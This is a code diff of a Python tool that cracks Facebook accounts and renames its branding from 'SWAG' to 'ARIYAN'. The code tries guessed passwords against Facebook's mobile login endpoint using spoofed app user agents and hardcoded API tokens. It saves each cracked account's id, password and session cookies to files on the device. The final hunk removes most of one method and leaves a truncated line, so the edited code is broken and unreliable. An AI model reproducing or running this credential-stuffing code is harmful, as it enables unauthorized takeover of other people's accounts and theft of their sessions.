@@ -56,7 +56,7 @@ def clear():os.system('clear');print(logo)
 def linex():print(f'{A}──────────────────────────────────────────────────')
 #__________________[ LOGO ]__________________#
 logo =f""" \033[92;1m
-    ###    ########  #### ##    ##    ###    ##    ## 
+   ###    ########  #### ##    ##    ###    ##    ## 
   ## ##   ##     ##  ##   ##  ##    ## ##   ###   ## 
  ##   ##  ##     ##  ##    ####    ##   ##  ####  ## 
 ##     ## ########   ##     ##    ##     ## ## ## ## 
@@ -223,7 +223,7 @@ class main_crack():
         try:
             global oks,cps,loop
             ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
-            sys.stdout.write(f"\r{G1}[{A}SAWG-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.write(f"\r{G1}[{A}ARIYAN-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -273,7 +273,7 @@ class main_crack():
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                     print(f"\r\r{G1}[ARIYAN-OK] {sid} | {ps} ")
-                    open('/sdcard/SWAG-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/ARIYAN-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
@@ -320,7 +320,8 @@ class main_crack():
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'authority': 'm.facebook.com',
+                headers = {
+    'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -338,7 +339,7 @@ class main_crack():
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'pro}
+    'user-agent': pro}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
@@ -347,7 +348,7 @@ class main_crack():
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\r{M}[SWAG-CP] {sid} | {ps} ")
+                    print(f"\r\r{M}[ARIYAN-CP] {sid} | {ps} ")
                     open('/sdcard/ARIYAN-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                 else:
@@ -394,7 +395,7 @@ class main_crack():
 #__________________[ RANDOM METHOD ]__________________#
 def randm(ids,psd):
     global loop,ok,cp
-    sys.stdout.write(f"\r{G1}[{A}SAWG-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
+    sys.stdout.write(f"\r{G1}[{A}ARIYAN-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -416,42 +417,4 @@ def randm(ids,psd):
             'currently_logged_in_userid':'0',
             'locale':'en_US',
             'client_country_code':'US',
-            'fb_api_req_friendly_name':'authenticate',
-            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
-            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head={'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
-            'Accept-Encoding':'gzip, deflate',
-            'Connection':'close',
-            'Content-Type':'application/x-www-form-urlencoded',
-            'Host':'graph.facebook.com',
-            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
-            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
-            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type':'WIFI',
-            'X-Tigon-Is-Retry':'False',
-            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'x-fb-device-group':'5120',
-            'X-FB-Friendly-Name':'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags':'graphservice',
-            'X-FB-HTTP-Engine':'Liger',
-            'X-FB-Client-IP':'True',
-            'X-FB-Server-Cluster':'True',
-            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'https://b-graph.facebook.com/auth/login'
-            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-            q = json.loads(po)
-            if 'access_token' in q:
-                uid = str(q['uid'])
-                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f'\r\r{G1}[ARIYAN-OK] {uid} | {pas}')
-                #print(f'\r\r{G1}[COOKIE]{A} {coki}')
-                open('/sdcard/TMT-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
-                ok.append(uid)
-                break
-            else:continue
-        loop+=1
-    except Exception as e:
-        pass
-          
-menu()
-#__________________[ END ]__________________#
+            'fb_api
